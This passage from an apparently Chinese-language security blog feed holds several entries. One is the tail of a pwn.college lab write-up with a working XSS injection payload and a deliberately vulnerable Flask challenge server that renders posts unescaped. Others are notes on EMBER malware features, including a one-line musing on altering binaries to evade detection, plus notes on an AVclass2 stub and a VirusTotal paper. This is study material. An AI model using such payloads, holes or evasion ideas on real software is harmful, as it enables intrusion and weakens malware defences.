class="string">&quot;Alert triggered! Your reward:&quot;</span>)</span><br><span class="line">    <span class="comment"># 输出 /flag 文件中的内容（通常是用于验证的 flag）</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read())  <span class="comment"># 打开 /flag 文件并读取内容，输出 flag</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-17-XSS-4"><a href="#3-17-XSS-4" class="headerlink" title="3.17 XSS 4"></a>3.17 XSS 4</h3><p>这个任务要求我们在<code>&lt;textarea name=msg&gt;&#123;flask.request.args.get(&quot;msg&quot;, &quot;Type your message here!&quot;)&#125;&lt;/textarea&gt;</code>中注入<code>&lt;script&gt;alert(&#39;PWNED&#39;)&lt;/script&gt;</code>，原理和之前类似，直接通过使用匹配注释掉对应的标签就可以了。</p><p>解决办法为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/challenge/victim <span class="string">&quot;http://challenge.localhost/?msg=&lt;/textarea&gt;&lt;script&gt;alert(&#x27;PWNED&#x27;)&lt;/script&gt;&lt;textarea&gt;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="3-17-XSS-5"><a href="#3-17-XSS-5" class="headerlink" title="3.17 XSS 5"></a>3.17 XSS 5</h3><p>server代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 Flask 应用</span></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 临时数据库类，用于创建临时数据库文件</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时数据库文件，带有 .db 后缀</span></span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 执行 SQL 语句</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 连接到临时数据库文件</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        <span class="comment"># 设置行工厂以返回字典格式的数据</span></span><br><span class="line">        connection.row_factory = sqlite3.Row</span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        <span class="comment"># 执行 SQL 语句</span></span><br><span class="line">        result = cursor.execute(sql, parameters)</span><br><span class="line">        <span class="comment"># 提交更改</span></span><br><span class="line">        connection.commit()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果程序以 root 权限运行，读取实际 flag 文件，否则使用虚拟 flag</span></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read().strip() <span class="keyword">if</span> os.geteuid() == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&quot;pwn.college&#123;fake_flag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建临时数据库实例</span></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个包含管理员未发布的草稿帖子的表</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE posts AS SELECT ? AS content, &quot;admin&quot; AS author, FALSE AS published&quot;&quot;&quot;</span>, [flag])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个用户表，其中包含管理员和其密码</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE users AS SELECT &quot;admin&quot; AS username, ? as password&quot;&quot;&quot;</span>, [flag])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向用户表中添加其他用户</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;guest&quot; as username, &quot;password&quot; as password&quot;&quot;&quot;</span>)</span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;hacker&quot; as username, &quot;1337&quot; as password&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录路由，处理 POST 请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_login</span>():</span><br><span class="line">    <span class="comment"># 获取提交的用户名和密码</span></span><br><span class="line">    username = flask.request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    password = flask.request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    <span class="comment"># 如果缺少用户名或密码参数，返回 400 错误</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `username` form parameter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> password:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `password` form parameter&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 验证用户名和密码是否匹配数据库中的用户</span></span><br><span class="line">    user = db.execute(<span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, password)).fetchone()</span><br><span class="line">    <span class="comment"># 如果用户不存在，则返回 403 错误</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将用户名存储在会话中，以保持用户登录状态</span></span><br><span class="line">    flask.session[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建草稿帖子的路由，处理 POST 请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/draft&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_draft</span>():</span><br><span class="line">    <span class="comment"># 检查用户是否登录</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flask.session:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Log in first!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取帖子内容</span></span><br><span class="line">    content = flask.request.form.get(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># 将新草稿插入到 posts 表中</span></span><br><span class="line">    db.execute(</span><br><span class="line">        <span class="string">&quot;INSERT INTO posts (content, author, published) VALUES (?, ?, ?)&quot;</span>,</span><br><span class="line">        (content, flask.session.get(<span class="string">&quot;username&quot;</span>), <span class="built_in">bool</span>(flask.request.form.get(<span class="string">&quot;publish&quot;</span>)))</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发布帖子的路由，处理 GET 请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/publish&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_publish</span>():</span><br><span class="line">    <span class="comment"># 检查用户是否登录</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flask.session:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Log in first!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将当前用户的草稿状态更新为已发布</span></span><br><span class="line">    db.execute(<span class="string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [flask.session.get(<span class="string">&quot;username&quot;</span>)])</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主页面的路由，显示登录表单或用户界面</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="comment"># 页面内容初始化</span></span><br><span class="line">    page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;\nWelcome to pwnpost, now with users!&lt;hr&gt;\n&quot;</span></span><br><span class="line">    username = flask.session.get(<span class="string">&quot;username&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果用户已登录，显示发布和草稿选项</span></span><br><span class="line">    <span class="keyword">if</span> username:</span><br><span class="line">        page += <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;form action=draft method=post&gt;</span></span><br><span class="line"><span class="string">              Post:&lt;textarea name=content&gt;Write something!&lt;/textarea&gt;</span></span><br><span class="line"><span class="string">              &lt;input type=checkbox name=publish&gt;Publish</span></span><br><span class="line"><span class="string">              &lt;input type=submit value=Save&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;&lt;br&gt;&lt;a href=publish&gt;Publish your drafts!&lt;/a&gt;&lt;hr&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 显示所有帖子</span></span><br><span class="line">        <span class="keyword">for</span> post <span class="keyword">in</span> db.execute(<span class="string">&quot;SELECT * FROM posts&quot;</span>).fetchall():</span><br><span class="line">            page += <span class="string">f&quot;&quot;&quot;&lt;h2&gt;Author: <span class="subst">&#123;post[<span class="string">&quot;author&quot;</span>]&#125;</span>&lt;/h2&gt;&quot;&quot;&quot;</span></span><br><span class="line">            <span class="comment"># 显示已发布的内容或草稿的前12个字符</span></span><br><span class="line">            <span class="keyword">if</span> post[<span class="string">&quot;published&quot;</span>]:</span><br><span class="line">                page += post[<span class="string">&quot;content&quot;</span>] + <span class="string">&quot;&lt;hr&gt;\n&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                page += <span class="string">f&quot;&quot;&quot;(Draft post, showing first 12 characters):&lt;br&gt;<span class="subst">&#123;post[<span class="string">&quot;content&quot;</span>][:<span class="number">12</span>]&#125;</span>&lt;hr&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 如果用户未登录，显示登录表单</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page += <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;form action=login method=post&gt;</span></span><br><span class="line"><span class="string">              Username:&lt;input type=text name=username&gt;</span></span><br><span class="line"><span class="string">              Password:&lt;input type=text name=password&gt;</span></span><br><span class="line"><span class="string">              &lt;input type=submit name=submit value=Login&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;&lt;hr&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 Flask 的密钥，用于加密会话信息</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># 设置服务器的名称</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:80&quot;</span></span><br><span class="line"><span class="comment"># 运行 Flask 应用</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, <span class="number">80</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Intro-to-Cybersecurity&quot;&gt;&lt;a href=&quot;#Intro-to-Cybersecurity&quot; class=&quot;headerlink&quot; title=&quot;Intro to Cybersecurity&quot;&gt;&lt;/a&gt;Intro to Cybersecuri</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ember-code-analysis</title>
    <link href="http://example.com/2024/06/08/ember-code-analysis/"/>
    <id>http://example.com/2024/06/08/ember-code-analysis/</id>
    <published>2024-06-08T06:24:07.000Z</published>
    <updated>2024-06-12T06:14:09.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ember源码解析"><a href="#ember源码解析" class="headerlink" title="ember源码解析"></a>ember源码解析</h1><h2 id="features-py"><a href="#features-py" class="headerlink" title="features.py"></a><code>features.py</code></h2><p>思考：</p><ol><li>如何修改二进制代码，在保留恶意功能的同时破坏特征值</li><li>如何挑选效果更好的特征值</li></ol><ul><li><p>用于抽取二进制码特征的父类。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FeatureType</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">raw_features</span>(<span class="params">self, bytez, lief_binary</span>): <span class="comment"># 生成一个可以被JSON序列化的特征表示。</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">process_raw_features</span>(<span class="params">self, raw_obj</span>): <span class="comment"># 用于处理 raw_obj 并将其转换为具体的特征向量 </span></span><br><span class="line">    </span><br><span class="line">  <span class="comment"># 这是一个具体方法，它提供了从原始字节和二进制文件中直接计算特征向量的功能。</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">feature_vector</span>(<span class="params">self, bytez, lief_binary</span>): </span><br><span class="line">    <span class="keyword">return</span> self.process_raw_features(self.raw_features(bytez, lief_binary))</span><br></pre></td></tr></table></figure></li><li><p>继承 featureType，实现字节直方图的计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ByteHistogram</span>(<span class="title class_ inherited__">FeatureType</span>):</span><br></pre></td></tr></table></figure></li><li><p>用于计算基于字节值和局部熵的二维直方图，这种直方图是基于熵的度量来近似字节值和其局部熵的联合概率分布。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ByteEntropyHistogram</span>(<span class="title class_ inherited__">FeatureType</span>):</span><br></pre></td></tr></table></figure></li><li><p>用于提取与文件段（sections）相关的特征信息，如段名称、大小、熵等，并使用哈希技巧（特征哈希）来汇总所有段信息成一个特征向量。</p></li></ul>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SectionInfo</span>(<span class="title class_ inherited__">FeatureType</span>):</span><br></pre></td></tr></table></figure><ul><li><p>该类专门用于从二进制文件中提取有关导入库和函数的信息，主要处理和转换这些信息为特征向量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ImportsInfo</span>(<span class="title class_ inherited__">FeatureType</span>)</span><br></pre></td></tr></table></figure></li><li><p>从二进制文件中提取导出函数的信息，并将其转换为特征向量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ExportsInfo</span>(<span class="title class_ inherited__">FeatureType</span>)</span><br></pre></td></tr></table></figure></li><li><p>提取二进制文件的一般信息，并将这些信息转换成特征向量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GeneralFileInfo</span>(<span class="title class_ inherited__">FeatureType</span>):</span><br></pre></td></tr></table></figure></li><li><p>从二进制文件的头部信息中提取相关的机器、架构、操作系统、链接器以及其他信息，并将这些信息转换为特征向量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">HeaderFileInfo</span>(<span class="title class_ inherited__">FeatureType</span>):</span><br></pre></td></tr></table></figure></li><li><p>从二进制文件的原始字节流中提取字符串信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StringExtractor</span>(<span class="title class_ inherited__">FeatureType</span>):</span><br></pre></td></tr></table></figure><blockquote><p>当分析一个文件（可能是一个文档、压缩包或另一个可执行文件）的二进制内容时，搜索包含“MZ”字样的字节序列是寻找嵌入可执行文件的一个简单且有效的方法。若在文件中的非起始位置发现“MZ”标记，这可能意味着有一个或多个可执行文件被嵌入或附加到了主文件中。</p></blockquote></li><li><p>从二进制文件的数据目录中提取大小和虚拟地址信息，并将这些信息转换为特征向量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DataDirectories</span>(<span class="title class_ inherited__">FeatureType</span>):</span><br></pre></td></tr></table></figure></li></ul><h2 id="init-py"><a href="#init-py" class="headerlink" title="__init__.py"></a><code>__init__.py</code></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ember源码解析&quot;&gt;&lt;a href=&quot;#ember源码解析&quot; class=&quot;headerlink&quot; title=&quot;ember源码解析&quot;&gt;&lt;/a&gt;ember源码解析&lt;/h1&gt;&lt;h2 id=&quot;features-py&quot;&gt;&lt;a href=&quot;#features-py&quot; c</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>AVCLASS2</title>
    <link href="http://example.com/2024/06/02/AVCLASS2/"/>
    <id>http://example.com/2024/06/02/AVCLASS2/</id>
    <published>2024-06-02T05:43:51.000Z</published>
    <updated>2024-06-02T06:46:49.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AVclass2-Massive-Malware-Tag-Extraction-from-AV-Labels"><a href="#AVclass2-Massive-Malware-Tag-Extraction-from-AV-Labels" class="headerlink" title="AVclass2: Massive Malware Tag Extraction from AV Labels"></a>AVclass2: Massive Malware Tag Extraction from AV Labels</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AVclass2-Massive-Malware-Tag-Extraction-from-AV-Labels&quot;&gt;&lt;a href=&quot;#AVclass2-Massive-Malware-Tag-Extraction-from-AV-Labels&quot; class=&quot;hea</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>A Deep Dive into VirusTotal</title>
    <link href="http://example.com/2024/05/28/A-Deep-Dive-into-VirusTotal/"/>
    <id>http://example.com/2024/05/28/A-Deep-Dive-into-VirusTotal/</id>
    <published>2024-05-28T07:10:11.000Z</published>
    <updated>2024-05-30T05:58:45.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="A-Deep-Dive-into-VirusTotal-Characterizing-and-Clustering-a-Massive-File-Feed"><a href="#A-Deep-Dive-into-VirusTotal-Characterizing-and-Clustering-a-Massive-File-Feed" class="headerlink" title="A Deep Dive into VirusTotal: Characterizing and Clustering a Massive File Feed"></a>A Deep Dive into VirusTotal: Characterizing and Clustering a Massive File Feed</h1><h2 id="摘要："><a href="#摘要：" class="headerlink" title="摘要："></a>摘要：</h2><p>论文回答的问题：</p><ul><li><p>这个源的多样性如何？</p><p>这个问题询问VT文件源中样本的多样性程度。多样性包括不同类型的恶意软件、不同的攻击技术、不同操作系统的恶意软件等。多样性高意味着数据源可以提供广泛的恶意软件样本，有助于研究和测试不同的防御机制。</p></li><li><p>它是否允许构建针对不同文件类型的恶意软件数据集？</p><p>这个问题探讨VT文件源是否包含足够多的不同文件类型（如可执行文件、脚本、文档等），以便研究人员可以构建专门针对特定文件类型的恶意软件数据集。这对于开发针对特定类型文件的专门安全工具和策略尤为重要。</p></li><li><p>它提供的样本有多新鲜？</p><p>这里询问的是VT文件源中样本的新鲜度，即样本从被捕获到上传到VT并可供研究的时间间隔有多短。新鲜度高的样本可以让研究人员和安全专家及时了解并对抗最新的恶意软件威胁。</p></li><li><p>它所见的恶意软件家族的分布是怎样的？</p><p>这个问题关注的是VT文件源中恶意软件家族的分布情况。家族分布可以反映出哪些类型的恶意软件最常见，哪些正在增加，这有助于安全研究人员和行业了解当前恶意软件的趋势和动态。</p></li><li><p>这种分布真的能代表用户设备上的恶意软件吗？</p><p>这个问题询问VT文件源中的恶意软件家族分布是否能准确反映普通用户设备上遭遇的恶意软件的实际情况。这是评估VT数据源在现实世界安全应用中有效性的重要方面，因为如果数据源的分布与实际情况相差甚远，那么基于这些数据的研究和解决方案可能无法有效应对真实的威胁。</p></li></ul><p>探索了如何通过研究可扩展的方法，在2.35亿样本的数据源上产生高纯度的聚类来进行大规模的威胁猎捕。</p><p>三种聚类方法：</p><ul><li>层次聚合聚类（HAC）</li><li>适用于TLSH摘要的更可扩展的HAC变体（HAC-T）</li><li>简单的特征值分组（FVG）</li></ul><p>最后，使用生成的聚类进行威胁猎捕，具体是用来检测那些被认为是良性的19万样本（即，检测结果为零的样本），这些样本可能实际上是恶意的，因为它们属于2.9万个聚类，其中大多数样本被检测为恶意。</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><ul><li>如何在不采用极端激进的过滤策略的情况下，将威胁猎捕扩展到文件源的内容上。</li></ul><h3 id="贡献："><a href="#贡献：" class="headerlink" title="贡献："></a>贡献：</h3><p>以下是对上文中提到的三个主要贡献的总结：</p><ol><li><p><strong>VT文件源的特性分析</strong>：</p><ul><li>我们利用一年内收集的2.35亿样本的3.28亿份分析报告，以及同期安全供应商的遥测数据，对VT文件源进行了详细的特性分析。</li><li>我们发现，尽管VT文件源的数据量是遥测数据的1&#x2F;17，但观测到的恶意软件数量却是遥测数据的8倍，显示出VT文件源在捕捉恶意软件方面的高效性。</li><li>文件源非常新鲜，每天接收超过一百万个新样本，这些样本在用户设备上出现后平均4.4小时就会出现在文件源中。</li><li>在新样本中，62%可以立即被标记为已知家族的变体，但有38%未被标记。0.3%的新样本最初完全未被检测到，但随后多个杀毒引擎开始标记它们。</li><li>文件源包含丰富的文件类型和至少有100个样本的4.9千个家族，但这种多样性主要由Windows和Android家族驱动。家族分布与遥测数据的观察结果显著不同，表明VT文件源可能不适合推断家族对真实用户的影响。</li></ul></li><li><p><strong>可扩展的聚类方法探索</strong>：</p><ul><li>我们评估了三种能够处理VT文件源中数亿样本的聚类方法：层次聚合聚类（HAC）、针对TLSH摘要的更高效的HAC版本（HAC-T）以及简单的按特征值分组（FVG）。</li><li>首先，我们使用Windows和Android的真实数据集来评估这些方法的准确性。</li><li>接着，我们评估了这些方法的可扩展性，发现只有FVG能够适应文件源的庞大数据量。</li></ul></li><li><p><strong>应用FVG聚类来检测完全未被发现的恶意软件</strong>：</p><ul><li>使用FVG，我们对2.35亿个样本进行聚类，不考虑它们是否已被杀毒引擎检测到。</li><li>我们识别出了29,000个FVG-vhash聚类，这些聚类中的多数样本被多个杀毒引擎检测到，包含了190,000个可能是恶意的、但未被检测到的样本。这表明FVG聚类方法在识别潜在恶意软件方面具有有效性。</li></ul></li></ol><h2 id="数据收集"><a href="#数据收集" class="headerlink" title="数据收集"></a>数据收集</h2><h2 id="数据特征"><a href="#数据特征" class="headerlink" title="数据特征"></a>数据特征</h2><ul><li>样本特征</li><li>扫描特征</li><li>派生特征</li></ul><p><img src="/../images/A-Deep-Dive-into-VirusTotal/%E6%88%AA%E5%B1%8F2024-05-29%2014.46.12.png" alt="截屏2024-05-29 14.46.12"></p><p>加密哈希 crypto-graphic hashes</p><ul><li>应用于整个文件的: sha256、sha1、md5</li><li>计算文件部分的：imphash、richpe_hash、cert_thumbprint、authentihash、icon_hash</li></ul><p>模糊哈希 fuzzy hashes</p><ul><li>tlsh 研究表明tlsh比ssdeep好；tlsh使用哈希值上的汉明距离来确定两个输入是否相似</li><li>ssdeep</li></ul><p>结构哈希</p><ul><li><strong>vhash:</strong> <ul><li>它考虑了样本属性，如导入、导出、段和文件大小。</li><li>vhash似乎是不同文件类型的一组结构哈希的通用名称。</li><li>VT为许多文件类型计算vhash（例如，PE可执行文件、APKs、PDFs、Office文档），但并非全部（例如，JPEG和PNG图像没有vhash）。</li><li>VT使用vhash为文件提供每日聚类。我们已经确认同一聚类中的样本具有相同的vhash值，因此我们使用等值比较两个vhash值。尽管是专有的且大部分未被文档记录，我们在第5节的实验评估显示vhash是一个用于聚类的良好特征。</li></ul></li></ul><p>时间戳（time stamp）</p><ul><li>scan_date</li><li>fseen_date</li><li>cert_valid_from</li><li>cert_valid_to</li></ul><p>杀毒扫描 AV scan</p><ul><li>我们提取检测到样本的引擎数量（即给出非空标签的引擎数量）（vt_score）</li></ul><p>程序 package_name</p><ul><li><code>package_name</code> 是Android应用的包标识符</li><li><code>vt_meaningful_name</code> 是VT为样本选择的最有意义的文件名（例如，在提交给VT时样本的所有文件名中选择）。</li></ul><p>派生特征 Derived Features</p><p>文件类型：</p><p>通过 trid_file_type、vt_tags、vt_meaningful_name</p><ul><li>trid_file_type 是使用TrID工具识别的文件类型</li><li>vt_tag：<img src="/../images/A-Deep-Dive-into-VirusTotal/%E6%88%AA%E5%B1%8F2024-05-29%2016.21.28.png" alt="截屏2024-05-29 16.21.28"></li><li>当vt_meaningful_name可用时，我们从文件名中提取扩展名，并将该扩展名映射到一个文件类型。</li></ul><p>AVClass 特征：</p><p>AVCLASS2 是一个病毒标记工具，</p><h2 id="文件源分析-Feed-Analysis"><a href="#文件源分析-Feed-Analysis" class="headerlink" title="文件源分析 Feed Analysis"></a>文件源分析 Feed Analysis</h2><p>回答了以下问题：</p><ul><li><p>(1) 